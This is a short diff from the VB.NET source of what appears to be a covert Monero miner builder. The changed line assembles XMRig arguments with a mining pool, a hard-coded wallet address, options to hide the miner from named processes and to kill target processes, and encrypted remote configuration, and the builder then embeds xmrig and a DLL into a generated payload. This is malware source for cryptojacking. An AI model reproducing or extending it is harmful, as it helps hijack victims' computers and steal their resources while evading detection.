@@ -85,7 +85,7 @@ Public Class Form1
                 Return
             End If
 
-            Dim argstr As String = " --cinit-find-x -B --algo=rx/0 --url=gulf.moneroocean.stream:20128 --user=""84AU5PjmTtYfp9SHxNLiE3aGsVw7tkKpX3EsgskWQW4FQ4KHSUMgLSNRKzkBXpiqrsFvpt65ndptz6LPHSRNQ6HgLTaNXik"" --pass=""{COMPUTERNAME}"" --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & If(FA.chkRemoteConfig.Checked, " --cinit-remote-config=""" & Unamlib_Encrypt(FA.txtRemoteConfig.Text) & """", "") & " " & If(toggleEnableStealth.Checked, " --cinit-stealth-targets=""" & Unamlib_Encrypt(FA.txtStealthTargets.Text) & """", "") & " " & If(FA.toggleProcessKiller.Checked, " --cinit-kill-targets=""" & Unamlib_Encrypt(FA.txtKillTargers.Text) & """", "") & " --tls"
+            Dim argstr As String = " --cinit-find-x -B --algo=rx/0 --url=gulf.moneroocean.stream:20128 --user=""84AU5PjmTtYfp9SHxNLiE3aGsVw7tkKpX3EsgskWQW4FQ4KHSUMgLSNRKzkBXpiqrsFvpt65ndptz6LPHSRNQ6HgLTaNXik"" --pass=""Githb-SXMRM-{COMPUTERNAME}"" --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & If(FA.chkRemoteConfig.Checked, " --cinit-remote-config=""" & Unamlib_Encrypt(FA.txtRemoteConfig.Text) & """", "") & " " & If(toggleEnableStealth.Checked, " --cinit-stealth-targets=""" & Unamlib_Encrypt(FA.txtStealthTargets.Text) & """", "") & " " & If(FA.toggleProcessKiller.Checked, " --cinit-kill-targets=""" & Unamlib_Encrypt(FA.txtKillTargers.Text) & """", "") & " --tls"
 
             minerbuilder.Replace("#dll", Resources_dll)
             minerbuilder.Replace("#xmr", Resources_xmrig)
